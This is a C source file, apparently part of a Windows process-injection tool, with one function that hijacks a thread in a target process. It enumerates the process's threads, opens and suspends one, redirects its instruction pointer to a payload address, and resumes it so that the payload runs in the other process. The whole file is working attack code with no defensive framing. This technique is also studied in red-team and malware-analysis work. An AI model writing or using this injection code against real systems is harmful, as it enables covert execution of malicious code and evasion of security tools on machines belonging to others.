#include "../include/injection.h"

BOOL HijackRemoteThread(IN DWORD ProcId, IN PVOID pPayload, OUT PDWORD remoteThreadID) {
    BOOL trigger1 = FALSE;
    BOOL trigger2 = FALSE;
    DWORD mainID = 0;
    DWORD secondID = 0;
    DWORD threadId = 0;
    THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };
    CONTEXT RThr = {
        .ContextFlags = CONTEXT_ALL
    };

    printf("[*] Creating thread snapshot for PID: %d...\n", ProcId);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    if (Thread32First(hSnap, &Thr)) {
        do {
            if (Thr.th32OwnerProcessID == ProcId && trigger1 != TRUE) {
                printf("[+] Found main thread ID = %d\n", Thr.th32ThreadID);
                mainID = Thr.th32ThreadID;
                trigger1 = TRUE;
            }
            else if (Thr.th32OwnerProcessID == ProcId && trigger1 == TRUE) {
                printf("[+] Found a secondary thread ID = %d\n", Thr.th32ThreadID);
                secondID = Thr.th32ThreadID;
                trigger2 = TRUE;
                break;
            }
        } while (Thread32Next(hSnap, &Thr));

        if (trigger2) {
            threadId = secondID;
        }
        else {
            threadId = mainID;
        }
    }

    if (threadId == 0) {
        printf("[!] No target thread found in process %d\n", ProcId);
        CloseHandle(hSnap);
        return FALSE;
    }

    printf("[*] Target thread selected: %d\n", threadId);

    HANDLE remoteThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (remoteThread == NULL || remoteThread == INVALID_HANDLE_VALUE) {
        printf("[!] OpenThread Failed With Error: %d\n", GetLastError());
        CloseHandle(hSnap);
        return FALSE;
    }
    printf("[+] Thread handle opened: 0x%p\n", remoteThread);

    printf("[*] Suspending thread %d...\n", threadId);
    if (SuspendThread(remoteThread) == (DWORD)-1) {
        printf("[!] SuspendThread Failed With Error: %d\n", GetLastError());
        CloseHandle(remoteThread);
        CloseHandle(hSnap);
        return FALSE;
    }

    printf("[*] Getting thread context...\n");
    if (!(GetThreadContext(remoteThread, &RThr))) {
        printf("[!] GetThreadContext Failed With Error: %d\n", GetLastError());
        ResumeThread(remoteThread);
        CloseHandle(remoteThread);
        CloseHandle(hSnap);
        return FALSE;
    }
    printf("[+] Original RIP: 0x%p\n", (PVOID)RThr.Rip);

    RThr.Rip = (DWORD64)pPayload;
    printf("[*] New RIP set to: 0x%p\n", pPayload);

    printf("[*] Setting modified thread context...\n");
    if (!(SetThreadContext(remoteThread, &RThr))) {
        printf("[!] SetThreadContext Failed With Error: %d\n", GetLastError());
        ResumeThread(remoteThread);
        CloseHandle(remoteThread);
        CloseHandle(hSnap);
        return FALSE;
    }

    printf("[*] Resuming thread %d...\n", threadId);
    ResumeThread(remoteThread);

    CloseHandle(remoteThread);
    CloseHandle(hSnap);
    *remoteThreadID = threadId;
    return TRUE;
}
